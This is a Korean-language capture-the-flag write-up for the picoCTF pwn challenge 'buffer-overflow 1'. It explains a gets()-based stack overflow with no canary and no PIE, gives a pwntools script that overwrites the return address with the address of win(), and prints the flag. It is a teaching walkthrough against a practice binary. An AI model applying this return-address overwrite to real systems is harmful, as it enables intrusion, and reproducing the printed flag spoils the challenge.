---
ctf_name: picoCTF 20244
challenge_name: buffer-overflow 1
category: pwn           # web / pwn / rev / crypto / misc
difficulty: easy      # easy / medium / hard / insane
author: sn0wyDay
date: 2022-03-29
points: 200
tags: [binaryexploitaion]
---

# 문제명
Buffer-overflow 1

## 문제 설명

> Control the return address. Additional details will be available after launching your challenge instance.

- https://play.picoctf.org/practice/challenge/258

## 풀이

### 분석

소스코드를 보면 vuln() 함수에서 gets(buf)를 사용하는데, 버퍼 크기가 32바이트로 고정되어 있지만, 입력 크기를 제한하지 않아 버퍼 오버플로우를 발생시킬 수 있다.
win()함수는 flag를 출력하지만 직접 호출되지 않으므로, 리턴 주소를 win()으로 덮어써야 한다.

### 취약점

vuln() 함수 내 gets(buf) 사용으로 인한 스택 버퍼 오버플로우. Checksec 결과 스택 카나리와 PIE가 없기 때문에 리턴 주소 덮어쓰기가 가능하다

### 익스플로잇

1. objdump -t vuln | grep win 으로 win()함수의 주소를 확인했는데, 0x080491f6 이 나왔다.
2. 버퍼(32바이트) + 패딩(12바이트) = 44바이트를 채운 뒤 win() 주소를 리틀엔디언으로 덮어쓴다.
3. 

```python
from pwn import *

p = remote("saturn.picoctf.net", 62026)

payload = b"A" * 44 + p32(0x080491f6)

p.sendlineafter(b"Please enter your string:", payload)

print(p.recvall().decode())
```

## 플래그

picoCTF{addr3ss3s_ar3_3asy_6462ca2d}

## 배운 점

- gets() 처럼 입력 크기를 제한하지 않는 함수를 사용하는데, 추가 길이 검사 장치가 없다면 버퍼 오버플로우에 취약하며, 스택 카나리와 PIE가 없는 환경에서는 리턴 주소를 원하는 함수 주소로 덮어써 실행 흐름을 바꿀 수 있다.

- 스택 카나리에 대해서 알게 되었는데, 함수가 리턴하기 전에 스택에 미리 심어둔 값이 변조됐는지 확인 하는 것이다. 이 문제의 경우 스택 카나리가 없기 때문에 바로 리턴 주소를 덮을 수 있었다. 따라서 추후에 카나리가 있는 문제를 어떻게 해결해야할 지에 대해서 공부해볼 것이다.

- PIE에 대해서 알게 되었는데, 바이너리가 실행될 때마다 주소가 바뀌는 것이다. PIE가 없기 때문에 objdump로 확인한 주소값을 그대로 사용한 것이라서 다음에는 PIE가 있는 문제는 어떻게 풀어야할 지에 대해서 생각해볼 것이다.
